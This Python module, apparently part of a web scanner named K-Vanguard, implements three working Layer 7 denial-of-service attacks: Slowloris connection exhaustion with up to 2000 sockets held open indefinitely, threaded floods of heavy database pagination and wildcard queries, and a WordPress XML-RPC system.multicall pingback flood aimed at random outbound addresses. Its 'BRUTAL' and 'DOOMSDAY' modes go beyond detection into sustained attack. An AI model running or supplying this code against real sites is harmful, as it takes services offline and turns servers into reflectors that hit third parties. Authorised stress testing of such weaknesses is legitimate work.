"""
Brutal DoS Hunter Module
Detects and exploits Layer 7 DoS vulnerabilities:
1. Slowloris (Connection Pool Exhaustion)
2. DB Pagination / Heavy Query Exhaustion
3. XML-RPC Amplification (Pingback Flood)
"""

from __future__ import annotations

import os
import random
import socket
import ssl
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional
from urllib.parse import urlparse, urlencode, parse_qsl, urlunparse

from rich.console import Console
from rich.panel import Panel
from rich.rule import Rule

from src.models import ScanResult
from src.config import SESSION
from src.modules.stress import _detect_protection
from src.scoring import score_and_report

console = Console()
C = {"bad": "bold red", "head": "bold cyan", "vuln": "bold red blink"}

# ─────────────────────────────────────────────────────────────────
# Configuration
# ─────────────────────────────────────────────────────────────────

_SLOWLORIS_SOCKETS_NORMAL = 150
_SLOWLORIS_SOCKETS_BRUTAL = 500
_SLOWLORIS_SOCKETS_DOOMSDAY = 2000
_SLOWLORIS_SLEEP = 10

_DB_DOS_WORKERS = 50
_DB_DOS_WORKERS_DOOMSDAY = 250

# ─────────────────────────────────────────────────────────────────
# 1. Slowloris Attack
# ─────────────────────────────────────────────────────────────────


def _create_slow_socket(
    host: str, port: int, is_ssl: bool, path: str = "/"
) -> Optional[socket.socket]:
    """Create and initialize a Slowloris socket."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        if is_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)

        s.connect((host, port))

        # Send initial partial request
        s.send(f"GET {path} HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {host}\r\n".encode("utf-8"))
        s.send(
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) K-Vanguard/1.0\r\n".encode(
                "utf-8"
            )
        )
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))

        return s
    except Exception:
        return None


def _run_slowloris(target_url: str, brutal: bool, progress, task) -> dict:
    """Execute Slowloris attack."""
    parsed = urlparse(target_url)
    host = parsed.hostname
    if not host:
        return {"status": "error", "reason": "Invalid target host"}

    is_ssl = parsed.scheme == "https"
    port = parsed.port or (443 if is_ssl else 80)
    path = parsed.path or "/"

    doomsday = os.environ.get("DOOMSDAY", "").strip() in ("1", "true", "yes")
    socket_count = (
        _SLOWLORIS_SOCKETS_DOOMSDAY
        if doomsday
        else _SLOWLORIS_SOCKETS_BRUTAL
        if brutal
        else _SLOWLORIS_SOCKETS_NORMAL
    )
    progress.update(
        task,
        description=f"[cyan]DoS Hunter:[/cyan] Spawning {socket_count} Slowloris sockets to {host}:{port}...",
    )

    sockets: list[socket.socket] = []

    # Spawn sockets
    for _ in range(socket_count):
        s = _create_slow_socket(host, port, is_ssl, path)
        if s:
            sockets.append(s)

    success_rate = len(sockets) / socket_count * 100  # noqa: F841

    if len(sockets) == 0:
        return {
            "status": "safe",
            "reason": "Failed to open any slow sockets. Target likely has anti-DDoS or connection limits.",
        }

    progress.update(
        task,
        description=f"[cyan]DoS Hunter:[/cyan] Holding {len(sockets)} sockets open. Target may be freezing...",
    )

    # Hold them open
    hold_time = 30 if not brutal else 999999
    start_time = time.time()
    dropped = 0

    while time.time() - start_time < hold_time:
        if brutal:
            progress.update(
                task,
                description=f"[bold red blink]☠ BRUTAL:[/bold red blink] Slowloris holding {len(sockets)} sockets. Ctrl+C to stop.",
            )

        for s in list(sockets):
            try:
                # Send a bogus header to keep connection alive
                s.send(
                    f"X-KVanguard-KeepAlive: {random.randint(1, 9999)}\r\n".encode(
                        "utf-8"
                    )
                )
            except Exception:
                sockets.remove(s)
                dropped += 1

        # Re-spawn dropped sockets
        for _ in range(socket_count - len(sockets)):
            new_s = _create_slow_socket(host, port, is_ssl, path)
            if new_s:
                sockets.append(new_s)

        time.sleep(_SLOWLORIS_SLEEP)

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    survival_rate = len(sockets) / max(1, socket_count) * 100

    if survival_rate > 50:
        return {
            "status": "vulnerable",
            "sockets_opened": socket_count,
            "sockets_survived": len(sockets),
            "reason": f"Server held {len(sockets)} incomplete connections open for {hold_time}s without dropping them.",
            "impact": "CRITICAL: Server worker pool can be easily exhausted.",
        }
    else:
        return {
            "status": "safe",
            "reason": f"Connections were dropped ({dropped} dropped). Server likely has timeout protections.",
        }


# ─────────────────────────────────────────────────────────────────
# 2. Database Pagination/Query Exhaustion
# ─────────────────────────────────────────────────────────────────


def _generate_heavy_urls(parameters: dict) -> list[str]:
    """Generate URLs with extremely heavy pagination or wildcards."""
    heavy_urls = []

    for base_url, params in parameters.items():
        parsed = urlparse(base_url)
        query_params = parse_qsl(parsed.query)

        heavy_query = []
        for key, _ in query_params:
            if any(p in key.lower() for p in ["page", "offset", "start", "limit", "p"]):
                heavy_query.append((key, "999999999"))
            elif any(p in key.lower() for p in ["search", "q", "query", "filter"]):
                heavy_query.append((key, "%" * 50))
            elif any(p in key.lower() for p in ["sort", "order"]):
                heavy_query.append((key, "email DESC, created_at ASC, id DESC"))
            else:
                heavy_query.append((key, "1"))

        if heavy_query:
            new_query = urlencode(heavy_query)
            heavy_url = urlunparse(parsed._replace(query=new_query))
            heavy_urls.append((base_url, heavy_url))

    return heavy_urls


def _run_db_dos(
    target_url: str, parameters: dict, brutal: bool, progress, task
) -> dict:
    """Test for DB exhaustion via heavy queries."""
    if not parameters:
        return {
            "status": "skipped",
            "reason": "No endpoints with parameters found to test.",
        }

    heavy_targets = _generate_heavy_urls(parameters)
    if not heavy_targets:
        return {
            "status": "skipped",
            "reason": "No pagination or search parameters found.",
        }

    progress.update(
        task,
        description=f"[cyan]DoS Hunter:[/cyan] Testing {len(heavy_targets)} endpoints for DB exhaustion...",
    )

    vulnerable_endpoints = []

    for base_url, heavy_url in heavy_targets[:5]:  # Test max 5 endpoints
        # Baseline request
        t0 = time.time()
        try:
            SESSION.get(base_url, timeout=5)
        except Exception:
            pass
        baseline_ms = (time.time() - t0) * 1000

        if brutal:
            # Spam the heavy URL
            progress.update(
                task,
                description="[bold red blink]☠ BRUTAL:[/bold red blink] Spamming DB exhaustion payload...",
            )
            errors = 0

            def _spam():
                try:
                    r = SESSION.get(heavy_url, timeout=10)
                    return r.status_code
                except Exception:
                    return 0

            doomsday = os.environ.get("DOOMSDAY", "").strip() in ("1", "true", "yes")
            workers = _DB_DOS_WORKERS_DOOMSDAY if doomsday else _DB_DOS_WORKERS
            spam_count = 500 if doomsday else 100

            with ThreadPoolExecutor(max_workers=workers) as pool:
                futs = [pool.submit(_spam) for _ in range(spam_count)]
                for f in as_completed(futs):
                    if f.result() >= 500 or f.result() == 0:
                        errors += 1

            if errors > 50:
                vulnerable_endpoints.append(
                    {
                        "url": heavy_url,
                        "reason": f"Brutal mode caused {errors}% 5xx/Timeout errors.",
                        "baseline_ms": baseline_ms,
                        "heavy_ms": ">10000 (Timeout)",
                    }
                )
        else:
            # Normal check - single heavy request
            t0 = time.time()
            try:
                SESSION.get(heavy_url, timeout=15)
            except Exception:
                pass
            heavy_ms = (time.time() - t0) * 1000

            # If latency spiked by >400% and is over 2 seconds
            if heavy_ms > (baseline_ms * 4) and heavy_ms > 2000:
                vulnerable_endpoints.append(
                    {
                        "url": heavy_url,
                        "reason": f"Latency spiked from {baseline_ms:.0f}ms to {heavy_ms:.0f}ms.",
                        "baseline_ms": baseline_ms,
                        "heavy_ms": heavy_ms,
                    }
                )

    if vulnerable_endpoints:
        return {
            "status": "vulnerable",
            "endpoints": vulnerable_endpoints,
            "impact": "HIGH: Database CPU/Memory can be exhausted via unoptimized queries.",
        }

    return {
        "status": "safe",
        "reason": "Database queries appear to be optimized or limited.",
    }


# ─────────────────────────────────────────────────────────────────
# 3. XML-RPC Amplification (Pingback Flood)
# ─────────────────────────────────────────────────────────────────


def _run_xmlrpc_dos(target_url: str, brutal: bool, progress, task) -> dict:
    """Test for WordPress XML-RPC Pingback amplification."""
    xmlrpc_url = target_url.rstrip("/") + "/xmlrpc.php"

    progress.update(
        task, description=f"[cyan]DoS Hunter:[/cyan] Probing {xmlrpc_url}..."
    )

    try:
        r = SESSION.get(xmlrpc_url, timeout=5)
        if "XML-RPC server accepts POST requests only" not in r.text:
            return {"status": "safe", "reason": "xmlrpc.php not found or disabled."}
    except Exception:
        return {"status": "safe", "reason": "xmlrpc.php unreachable."}

    # Check if pingback.ping is enabled
    payload = """
    <?xml version="1.0" encoding="utf-8"?>
    <methodCall>
    <methodName>system.listMethods</methodName>
    <params></params>
    </methodCall>
    """
    try:
        r = SESSION.post(xmlrpc_url, data=payload, timeout=5)
        if "pingback.ping" not in r.text:
            return {"status": "safe", "reason": "Pingback feature is disabled."}
    except Exception:
        pass

    if brutal:
        progress.update(
            task,
            description="[bold red blink]☠ BRUTAL:[/bold red blink] Flooding system.multicall pingbacks...",
        )
        # system.multicall amplification
        multicall_payload = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>'
        for i in range(100):
            multicall_payload += f"""
            <value><struct>
            <member><name>methodName</name><value><string>pingback.ping</string></value></member>
            <member><name>params</name><value><array><data>
            <value><string>http://{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}</string></value>
            <value><string>{target_url}</string></value>
            </data></array></value></member>
            </struct></value>
            """
        multicall_payload += "</data></array></value></param></params></methodCall>"

        def _shoot():
            try:
                SESSION.post(xmlrpc_url, data=multicall_payload, timeout=10)
            except Exception:
                pass

        doomsday = os.environ.get("DOOMSDAY", "").strip() in ("1", "true", "yes")
        workers = 100 if doomsday else 20
        spam_count = 250 if doomsday else 50

        with ThreadPoolExecutor(max_workers=workers) as pool:
            for _ in range(spam_count):
                pool.submit(_shoot)

        return {
            "status": "vulnerable",
            "reason": "Successfully flooded server with system.multicall pingbacks.",
            "url": xmlrpc_url,
            "impact": "CRITICAL: Target can be used as a reflector for DDoS attacks.",
        }
    else:
        # Normal check: try one pingback to localhost to see if it resolves
        payload = f"""
        <?xml version="1.0" encoding="utf-8"?>
        <methodCall>
        <methodName>pingback.ping</methodName>
        <params>
        <param><value><string>http://127.0.0.1:22</string></value></param>
        <param><value><string>{target_url}</string></value></param>
        </params>
        </methodCall>
        """
        try:
            r = SESSION.post(xmlrpc_url, data=payload, timeout=5)
            # faultCode 16: The source URL does not exist (Means it TRIED to ping!)
            # faultCode 17: The source URL does not contain a link to the target URL
            if (
                "<int>16</int>" in r.text
                or "<int>17</int>" in r.text
                or "faultCode" in r.text
            ):
                return {
                    "status": "vulnerable",
                    "reason": "XML-RPC Pingback is enabled. Server actively attempts outbound requests.",
                    "url": xmlrpc_url,
                    "impact": "CRITICAL: Target can be used as a reflector for DDoS attacks.",
                }
        except Exception:
            pass

    return {"status": "safe", "reason": "Pingback attempts blocked or ignored."}


# ─────────────────────────────────────────────────────────────────
# Module entry point
# ─────────────────────────────────────────────────────────────────


def run_dos(target_url: str, hostname: str, result: ScanResult, progress, task) -> None:
    """Run all 3 Layer 7 DoS vulnerability checks."""
    brutal = os.environ.get("BRUTAL", "").strip() in ("1", "true", "yes") or getattr(
        result, "brutal_mode", False
    )

    findings = {}

    # Phase 0: WAF / CDN protection check
    # Slowloris only hits the EDGE (Cloudflare/Akamai), not the real server.
    # Skip it to avoid a useless false positive and avoid burning our IP.
    progress.update(
        task,
        description="[cyan]DoS Hunter:[/cyan] Checking for WAF / CDN protection...",
    )
    protection = _detect_protection(target_url, getattr(result, "waf_cdn", {}))

    # Check 1: Slowloris (skipped if WAF detected)
    if protection["protected"]:
        findings["slowloris"] = {
            "status": "skipped",
            "reason": f"WAF/CDN detected ({protection['reason']}). Slowloris only exhausts edge servers, "
            "not the origin. Skipping to avoid false positives.",
        }
        progress.update(
            task,
            description="[yellow]DoS Hunter:[/yellow] Slowloris skipped — WAF/CDN detected.",
        )
    else:
        findings["slowloris"] = _run_slowloris(target_url, brutal, progress, task)

    # Check 2: DB Pagination Exhaustion (app-level — runs regardless of WAF)
    parameters = getattr(result, "parameters", {})
    findings["db_dos"] = _run_db_dos(target_url, parameters, brutal, progress, task)

    # Check 3: XML-RPC Amplification (app-level — runs regardless of WAF)
    findings["xmlrpc"] = _run_xmlrpc_dos(target_url, brutal, progress, task)

    result.dos_findings = findings
    progress.update(task, completed=100)
    score_and_report(result, "dos")


# ─────────────────────────────────────────────────────────────────
# Display function
# ─────────────────────────────────────────────────────────────────


def score_dos(result):
    findings = result.dos_findings
    if not findings:
        return 100
    vulns = findings.get("vulnerabilities", []) if isinstance(findings, dict) else []
    if not vulns:
        return 100
    return max(0, 100 - min(len(vulns) * 20, 80))


def display_dos(result: ScanResult) -> None:
    findings = getattr(result, "dos_findings", {})
    if not findings:
        return

    console.print(
        Rule(f"[{C['vuln']}]💥   LAYER 7 DOS HUNTER[/{C['vuln']}]", style="red")
    )

    is_vuln = False

    # Slowloris
    slow = findings.get("slowloris", {})
    if slow.get("status") == "vulnerable":
        is_vuln = True
        console.print(
            Panel(
                f"[bold red]🐢 Slowloris (Connection Exhaustion)[/bold red]\n\n"
                f"[bold]Target:[/bold] {result.target}\n"
                f"[bold]Details:[/bold] {slow.get('reason')}\n"
                f"[bold]Impact:[/bold] {slow.get('impact')}",
                border_style="red",
                title="[red blink]VULNERABLE[/red blink]",
            )
        )

    # DB DoS
    db = findings.get("db_dos", {})
    if db.get("status") == "vulnerable":
        is_vuln = True
        endpoints = db.get("endpoints", [])

        db_txt = "[bold red]🔍 Database Query Exhaustion[/bold red]\n\n"
        for ep in endpoints:
            db_txt += f"• [cyan]{ep['url']}[/cyan]\n"
            db_txt += f"  [dim]Baseline: {ep['baseline_ms']:.0f}ms → Payload: {ep['heavy_ms'] if isinstance(ep['heavy_ms'], str) else f'{ep['heavy_ms']:.0f}ms'}[/dim]\n"
            db_txt += f"  {ep['reason']}\n\n"

        console.print(
            Panel(
                db_txt.strip(),
                border_style="red",
                title="[red blink]VULNERABLE[/red blink]",
            )
        )

    # XML-RPC
    xml = findings.get("xmlrpc", {})
    if xml.get("status") == "vulnerable":
        is_vuln = True
        console.print(
            Panel(
                f"[bold red]💥 XML-RPC Pingback Amplification[/bold red]\n\n"
                f"[bold]URL:[/bold] [cyan]{xml.get('url')}[/cyan]\n"
                f"[bold]Details:[/bold] {xml.get('reason')}\n"
                f"[bold]Impact:[/bold] {xml.get('impact')}",
                border_style="red",
                title="[red blink]VULNERABLE[/red blink]",
            )
        )

    if not is_vuln:
        console.print(
            "  [green]No Layer 7 DoS vulnerabilities detected. Target is resilient.[/green]\n"
        )
    else:
        console.print()


def export_dos(result: ScanResult, W: callable) -> None:
    W("### 💣 Layer 7 DoS Analysis\n\n")
    df = result.dos_findings
    if df:
        slow = df.get("slowloris", {})
        status = slow.get("status", "not_run")
        if status == "vulnerable":
            W("> [!CAUTION]\n> **Slowloris: VULNERABLE**\n\n")
            W(f"- **Impact:** {slow.get('impact', '?')}\n")
            W(f"- **Detail:** {slow.get('reason', '?')}\n")
            W(
                f"- **Sockets Opened:** {slow.get('sockets_opened', '?')} | **Survived:** {slow.get('sockets_survived', '?')}\n\n"
            )
        elif status == "skipped":
            W(f"- **Slowloris:** ⏭️ Skipped — {slow.get('reason', '')}\n\n")
        else:
            W(f"- **Slowloris:** ✅ {slow.get('reason', 'Safe')}\n\n")

        db = df.get("db_dos", {})
        if db.get("status") == "vulnerable":
            W("> [!CAUTION]\n> **Database Exhaustion: VULNERABLE**\n\n")
            W(f"- **Impact:** {db.get('impact', '?')}\n")
            for ep in db.get("endpoints", []):
                W(f"  - `{ep['url']}`\n")
                heavy_str = (
                    ep["heavy_ms"]
                    if isinstance(ep["heavy_ms"], str)
                    else f"{ep['heavy_ms']:.0f}ms"
                )
                W(
                    f"    - Baseline: `{ep['baseline_ms']:.0f}ms` → Payload: `{heavy_str}`\n"
                )
        elif db.get("status") == "skipped":
            W(f"- **Database Exhaustion:** ⏭️ {db.get('reason', 'Skipped')}\n")
        else:
            W(f"- **Database Exhaustion:** ✅ {db.get('reason', 'Safe')}\n")
        W("\n")

        xml = df.get("xmlrpc", {})
        if xml.get("status") == "vulnerable":
            W("> [!CAUTION]\n> **XML-RPC Amplification: VULNERABLE**\n\n")
            W(f"- **URL:** `{xml.get('url', '?')}`\n")
            W(f"- **Detail:** {xml.get('reason', '?')}\n")
            W(f"- **Impact:** {xml.get('impact', '?')}\n")
        else:
            W(f"- **XML-RPC:** ✅ {xml.get('reason', 'Safe')}\n")
    else:
        W("- DoS module was not run.\n")
    W("\n")
